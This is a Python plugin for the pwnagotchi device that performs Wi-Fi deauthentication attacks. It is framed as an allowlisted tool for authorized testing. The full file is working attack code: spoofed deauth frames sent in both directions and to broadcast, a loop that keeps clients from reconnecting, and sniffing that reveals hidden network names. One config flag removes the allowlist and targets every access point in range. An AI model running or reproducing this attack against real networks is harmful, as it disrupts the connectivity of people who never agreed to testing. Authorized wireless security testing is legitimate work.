#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
cutecat_scoped - scoped deauth test plugin for pwnagotchi
Author: ShaddamIV (reworked)
License: cute cat

Authorized WLAN resilience testing only. This plugin ONLY acts against
access points you have explicitly placed on the allowlist (by BSSID or
SSID). With enforcement on and an empty allowlist it does nothing.

What it does:
- Targeted 802.11 deauth against clients of in-scope APs.
- Optional per-AP broadcast deauth (all clients of ONE in-scope AP), toggle.
- Writes a JSONL audit log (timestamp, target, frames, reason) for reporting.

What it does NOT do (removed as non-functional / out of scope):
- No PMF/802.11w "bypass" (802.11w is designed to resist that).
- No WPA3->WPA2 downgrade (needs a rogue AP, not stray frames).
- No global/indiscriminate broadcast flood.
"""

import json
import logging
import os
import threading
import time
from typing import List, Optional

import pwnagotchi.plugins as plugins

try:
    from scapy.all import (RadioTap, Dot11, Dot11Deauth, Dot11Beacon,
                           Dot11ProbeResp, Dot11AssoReq, Dot11Elt, sendp, sniff)
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

BROADCAST = "ff:ff:ff:ff:ff:ff"
# Linux ARPHRD type for a monitor-mode (radiotap) interface.
ARPHRD_IEEE80211_RADIOTAP = 803


def _norm_mac(mac: Optional[str]) -> str:
    """Lowercase + stripped MAC for stable comparisons."""
    return (mac or "").strip().lower()


class CuteCatScoped(plugins.Plugin):
    __author__ = 'ShaddamIV'
    __version__ = '2.0'
    __license__ = 'cute cat'
    __description__ = 'Scoped, allowlisted deauth test tool (authorized use only)'

    def __init__(self):
        super().__init__()
        self.logger = logging.getLogger(__name__)
        self.scapy_available = SCAPY_AVAILABLE

        # --- defaults (overridden by config.toml) ---
        self.configured_iface = None          # force an interface, else auto-detect
        self.resolved_iface = None            # what we actually inject on
        self.enforce_allowlist = True         # fail-safe: empty list => attack nothing
        self.allowlist_bssids = set()
        self.allowlist_ssids = set()
        self.enable_targeted = True
        self.enable_broadcast = False         # per-AP broadcast, opt-in
        self.reason_codes = [1, 7]            # 1=unspecified, 7=class-3-from-nonassoc
        self.bursts = 2                       # frames sent per (target, reason)
        self.max_clients = 3                  # cap clients per AP per round
        self.attack_interval = 30             # seconds between rounds
        self.follow_channel = True            # lock NIC to AP channel before sending
        self.dwell_time = 3.0                 # seconds to keep pressure on each AP
        self.detect_pmf = True                # sniff RSN caps -> is the AP protected?
        self.skip_pmf = False                 # skip APs that REQUIRE PMF (deauth won't work)
        self.reveal_hidden = True             # de-cloak hidden SSIDs from probe/assoc frames
        self.log_hidden = True                # passively log hidden APs in range (no attack)
        self.audit_path = "/etc/pwnagotchi/log/cutecat_audit.jsonl"

        # --- runtime state ---
        self.last_attack = 0.0
        self.attack_count = 0
        self._pmf_cache = {}                  # bssid -> "none"/"capable"/"required"/"unknown"
        self._ssid_cache = {}                 # bssid -> revealed SSID of a hidden network
        self._seen_hidden = set()             # hidden BSSIDs already logged (discovery)
        self._lock = threading.Lock()
        self._worker = None

    # ------------------------------------------------------------------
    # Lifecycle
    # ------------------------------------------------------------------
    def on_loaded(self):
        if not self.scapy_available:
            self.logger.error("[cutecat] scapy not available - plugin inactive")
            return
        self.logger.info("[cutecat] loaded (scoped edition)")

    def on_config_changed(self, config):
        cfg = config["main"]["plugins"].get("cutecat_scoped", {})

        self.configured_iface = cfg.get("inject_iface")  # may be None -> auto-detect
        self.enforce_allowlist = bool(cfg.get("enforce_allowlist", True))
        self.allowlist_bssids = {_norm_mac(m) for m in cfg.get("allowlist_bssids", []) if m}
        self.allowlist_ssids = {str(s).strip() for s in cfg.get("allowlist_ssids", []) if s}
        self.enable_targeted = bool(cfg.get("enable_targeted", True))
        self.enable_broadcast = bool(cfg.get("enable_broadcast", False))
        self.reason_codes = list(cfg.get("reason_codes", [1, 7]))
        self.bursts = int(cfg.get("bursts", 2))
        self.max_clients = int(cfg.get("max_clients", 3))
        self.attack_interval = int(cfg.get("attack_interval", 30))
        self.follow_channel = bool(cfg.get("follow_channel", True))
        self.dwell_time = float(cfg.get("dwell_time", 3.0))
        self.detect_pmf = bool(cfg.get("detect_pmf", True))
        self.skip_pmf = bool(cfg.get("skip_pmf", False))
        self.reveal_hidden = bool(cfg.get("reveal_hidden", True))
        self.log_hidden = bool(cfg.get("log_hidden", True))
        self.audit_path = cfg.get("audit_path", self.audit_path)

        self.logger.info(
            "[cutecat] config: enforce=%s bssids=%d ssids=%d targeted=%s broadcast=%s",
            self.enforce_allowlist, len(self.allowlist_bssids),
            len(self.allowlist_ssids), self.enable_targeted, self.enable_broadcast,
        )
        if self.enforce_allowlist and not self.allowlist_bssids and not self.allowlist_ssids:
            self.logger.warning(
                "[cutecat] allowlist enforced but EMPTY - nothing will be attacked "
                "(add allowlist_bssids / allowlist_ssids to config)"
            )

    def on_ready(self, agent):
        self.agent = agent
        self.resolved_iface = self._resolve_iface()
        self.logger.info("[cutecat] ready - injecting on: %s", self.resolved_iface)

    def on_unload(self, ui):
        self.logger.info("[cutecat] unloaded")

    # ------------------------------------------------------------------
    # Interface handling
    # ------------------------------------------------------------------
    def _monitor_ifaces(self) -> List[str]:
        """Return all interfaces currently in monitor (radiotap) mode."""
        found = []
        try:
            for name in os.listdir("/sys/class/net"):
                try:
                    with open("/sys/class/net/%s/type" % name) as fh:
                        if int(fh.read().strip()) == ARPHRD_IEEE80211_RADIOTAP:
                            found.append(name)
                except (OSError, ValueError):
                    continue
        except OSError:
            pass
        return found

    def _resolve_iface(self) -> str:
        """Pick the interface to inject on, regardless of USB naming."""
        mons = self._monitor_ifaces()
        # 1) honor an explicit config value if it is actually in monitor mode
        if self.configured_iface:
            if not mons or self.configured_iface in mons:
                return self.configured_iface
            self.logger.warning(
                "[cutecat] configured iface %s is not in monitor mode; monitors=%s",
                self.configured_iface, mons,
            )
        # 2) prefer a *mon interface, else the first monitor iface found
        for name in mons:
            if name.endswith("mon"):
                return name
        if mons:
            return mons[0]
        # 3) last resort: whatever was configured, or wlan0mon
        return self.configured_iface or "wlan0mon"

    def _set_channel(self, channel) -> None:
        if not self.follow_channel or not channel:
            return
        try:
            os.system("iw dev %s set channel %d >/dev/null 2>&1"
                      % (self.resolved_iface, int(channel)))
        except (ValueError, TypeError):
            pass

    # ------------------------------------------------------------------
    # PMF (802.11w) detection -- tells us if deauth can even work, and is
    # itself a reportable finding.
    # ------------------------------------------------------------------
    @staticmethod
    def _parse_rsn_pmf(info: bytes) -> str:
        """Parse an RSN IE body; return none/capable/required/unknown."""
        try:
            i = 2                                   # skip version
            i += 4                                  # group cipher suite
            pc = int.from_bytes(info[i:i + 2], "little"); i += 2
            i += 4 * pc                             # pairwise cipher suites
            ac = int.from_bytes(info[i:i + 2], "little"); i += 2
            i += 4 * ac                             # AKM suites
            if i + 2 > len(info):
                return "none"                       # no RSN capabilities field
            caps = int.from_bytes(info[i:i + 2], "little")
            if caps & (1 << 6):                     # MFPR: PMF required
                return "required"
            if caps & (1 << 7):                     # MFPC: PMF capable
                return "capable"
            return "none"
        except Exception:
            return "unknown"

    def _detect_pmf(self, bssid: str) -> str:
        """Sniff a beacon from this BSSID and read its PMF stance."""
        result = {"val": "unknown"}

        def handler(pkt):
            if pkt.haslayer(Dot11Beacon) and _norm_mac(pkt.addr3) == bssid:
                elt = pkt.getlayer(Dot11Elt)
                while elt is not None:
                    if elt.ID == 48:               # RSN IE
                        result["val"] = self._parse_rsn_pmf(bytes(elt.info))
                        return True
                    elt = elt.payload.getlayer(Dot11Elt)
                result["val"] = "none"             # no RSN IE => open/WEP/WPA1
                return True
            return False

        try:
            sniff(iface=self.resolved_iface, prn=handler, timeout=2,
                  store=0, stop_filter=handler)
        except Exception as exc:
            self.logger.debug("[cutecat] PMF sniff failed: %s", exc)
        return result["val"]

    def _reveal_ssid(self, bssid: str) -> Optional[str]:
        """Learn a hidden network's SSID from probe-response / assoc-request
        frames (the name is sent in clear even when beacons hide it)."""
        found = {"ssid": None}

        def handler(pkt):
            if not pkt.haslayer(Dot11):
                return False
            if bssid not in (_norm_mac(pkt.addr2), _norm_mac(pkt.addr3)):
                return False
            if not (pkt.haslayer(Dot11ProbeResp) or pkt.haslayer(Dot11AssoReq)):
                return False
            elt = pkt.getlayer(Dot11Elt)
            while elt is not None:
                if elt.ID == 0:                         # SSID element
                    raw = bytes(elt.info)
                    if raw and any(b != 0 for b in raw):
                        found["ssid"] = raw.decode("utf-8", "replace")
                        return True
                    return False                        # still blank
                elt = elt.payload.getlayer(Dot11Elt)
            return False

        try:
            sniff(iface=self.resolved_iface, prn=handler, timeout=3,
                  store=0, stop_filter=handler)
        except Exception as exc:
            self.logger.debug("[cutecat] reveal sniff failed: %s", exc)
        return found["ssid"]

    # ------------------------------------------------------------------
    # Scope check
    # ------------------------------------------------------------------
    def _ap_in_scope(self, bssid: str, ssid: str) -> bool:
        if not self.enforce_allowlist:
            return True
        if _norm_mac(bssid) in self.allowlist_bssids:
            return True
        if ssid and ssid in self.allowlist_ssids:
            return True
        return False

    # ------------------------------------------------------------------
    # Audit log (one JSON object per line)
    # ------------------------------------------------------------------
    def _audit(self, **fields) -> None:
        fields["ts"] = time.strftime("%Y-%m-%dT%H:%M:%S%z")
        fields["iface"] = self.resolved_iface
        try:
            with open(self.audit_path, "a") as fh:
                fh.write(json.dumps(fields) + "\n")
        except OSError as exc:
            self.logger.debug("[cutecat] audit write failed: %s", exc)

    # ------------------------------------------------------------------
    # Frame sending
    # ------------------------------------------------------------------
    def _send(self, pkt, count: int) -> int:
        try:
            sendp(pkt, iface=self.resolved_iface, count=count, verbose=0)
            return count
        except Exception as exc:  # scapy raises a variety of OSError subclasses
            self.logger.debug("[cutecat] send failed on %s: %s", self.resolved_iface, exc)
            # interface name may have changed (USB re-enumeration); re-resolve once
            self.resolved_iface = self._resolve_iface()
            return 0

    def _deauth(self, dst: str, src: str, bssid: str) -> int:
        """Send deauth frames for each configured reason code; return frame count."""
        sent = 0
        for reason in self.reason_codes:
            pkt = (RadioTap()
                   / Dot11(addr1=dst, addr2=src, addr3=bssid)
                   / Dot11Deauth(reason=reason))
            sent += self._send(pkt, self.bursts)
            time.sleep(0.005)
        return sent

    def targeted_deauth(self, bssid: str, ssid: str, client_macs: List[str],
                        pmf: str = "n/a") -> None:
        total = 0
        for cl_mac in client_macs[:self.max_clients]:
            # spoof AP -> client, and client -> AP (both directions, standard)
            total += self._deauth(cl_mac, bssid, bssid)
            total += self._deauth(bssid, cl_mac, bssid)
        self.logger.info("[cutecat] targeted %s (%s) pmf=%s: %d frames",
                         bssid, ssid, pmf, total)
        self._audit(action="targeted", bssid=bssid, ssid=ssid, pmf=pmf,
                    clients=client_macs[:self.max_clients],
                    reason_codes=self.reason_codes, frames=total)

    def broadcast_deauth(self, bssid: str, ssid: str, pmf: str = "n/a") -> None:
        """Deauth ALL clients of a single in-scope AP (scoped to its BSSID)."""
        total = self._deauth(BROADCAST, bssid, bssid)
        self.logger.info("[cutecat] broadcast %s (%s) pmf=%s: %d frames",
                         bssid, ssid, pmf, total)
        self._audit(action="broadcast", bssid=bssid, ssid=ssid, pmf=pmf,
                    reason_codes=self.reason_codes, frames=total)

    # ------------------------------------------------------------------
    # Passive discovery (log only, never engages)
    # ------------------------------------------------------------------
    def _log_discovered_hidden(self, aps: list) -> None:
        """Record hidden APs seen in range so you can choose which BSSIDs to
        add to the allowlist. This NEVER attacks anything."""
        for ap in aps:
            ssid = ap.get("hostname", "") or ""
            bssid = _norm_mac(ap.get("mac"))
            if not bssid or (ssid and ssid != "<hidden>"):
                continue                      # no BSSID, or a visible network
            if bssid in self._seen_hidden:
                continue                      # already logged this one
            self._seen_hidden.add(bssid)
            in_scope = self._ap_in_scope(bssid, "")
            self.logger.info(
                "[cutecat] hidden AP in range: %s ch=%s in_scope=%s (NOT engaged)",
                bssid, ap.get("channel"), in_scope)
            self._audit(action="discover_hidden", bssid=bssid,
                        channel=ap.get("channel"), in_scope=in_scope, engaged=False)

    # ------------------------------------------------------------------
    # Main loop
    # ------------------------------------------------------------------
    def _run_round(self, aps: list) -> None:
        in_scope = 0
        for ap in aps:
            bssid = _norm_mac(ap.get("mac"))
            ssid = ap.get("hostname", "") or ""
            if ssid == "<hidden>":
                ssid = ""                      # normalize so de-cloak kicks in
            if not bssid or not self._ap_in_scope(bssid, ssid):
                continue
            in_scope += 1

            # Lock to the AP's channel BEFORE anything else - this is the
            # single biggest factor in whether frames actually land.
            self._set_channel(ap.get("channel"))

            # Hidden SSID? Beacon hid the name but not the BSSID (which is how
            # it got allowlisted). Try to de-cloak it for the report.
            if not ssid and self.reveal_hidden:
                ssid = self._ssid_cache.get(bssid)
                if not ssid:
                    revealed = self._reveal_ssid(bssid)
                    if revealed:
                        ssid = self._ssid_cache[bssid] = revealed
                        self.logger.info("[cutecat] de-cloaked %s -> %s",
                                         bssid, revealed)
                        self._audit(action="reveal_ssid", bssid=bssid, ssid=revealed)
                ssid = ssid or "<hidden>"

            # Is this AP even deauth-able? (and record it for the report)
            pmf = "disabled"
            if self.detect_pmf:
                pmf = self._pmf_cache.get(bssid)
                if pmf is None:
                    pmf = self._detect_pmf(bssid)
                    self._pmf_cache[bssid] = pmf
                if pmf == "required" and self.skip_pmf:
                    self.logger.info("[cutecat] %s (%s) requires PMF - skipping",
                                     bssid, ssid)
                    self._audit(action="skip_pmf", bssid=bssid, ssid=ssid, pmf=pmf)
                    continue

            clients = [_norm_mac(c.get("mac")) for c in ap.get("clients", [])
                       if c.get("mac")]
            has_targeted = self.enable_targeted and clients
            if not self.enable_broadcast and not has_targeted:
                continue  # nothing to send for this AP

            # Keep pressure on for dwell_time so clients can't re-associate.
            deadline = time.time() + max(0.0, self.dwell_time)
            while True:
                if self.enable_broadcast:
                    self.broadcast_deauth(bssid, ssid, pmf)
                if has_targeted:
                    self.targeted_deauth(bssid, ssid, clients, pmf)
                if time.time() >= deadline:
                    break

        if in_scope == 0:
            self.logger.debug("[cutecat] no in-scope APs this round")
        self._worker = None  # mark finished

    def on_epoch(self, agent, epoch, epoch_data):
        if not self.scapy_available:
            return

        try:
            session = agent.session() or {}
            aps = session.get("wifi", {}).get("aps", [])
        except Exception as exc:
            self.logger.debug("[cutecat] could not read session: %s", exc)
            return

        # Passive discovery runs every epoch, independent of attacking.
        if self.log_hidden:
            self._log_discovered_hidden(aps)

        now = time.time()
        if now - self.last_attack < self.attack_interval:
            return

        # don't stack rounds if a previous one is still sending
        if self._worker and self._worker.is_alive():
            return

        if not self.enable_targeted and not self.enable_broadcast:
            return

        self.last_attack = now
        self.attack_count += 1
        self.logger.info("[cutecat] epoch %s - round #%d (%d APs visible)",
                         epoch, self.attack_count, len(aps))

        with self._lock:
            self._worker = threading.Thread(
                target=self._run_round, args=(aps,), daemon=True)
            self._worker.start()

    def on_handshake(self, agent, filename, access_point, client_station):
        self.logger.info("[cutecat] handshake captured: %s", filename)
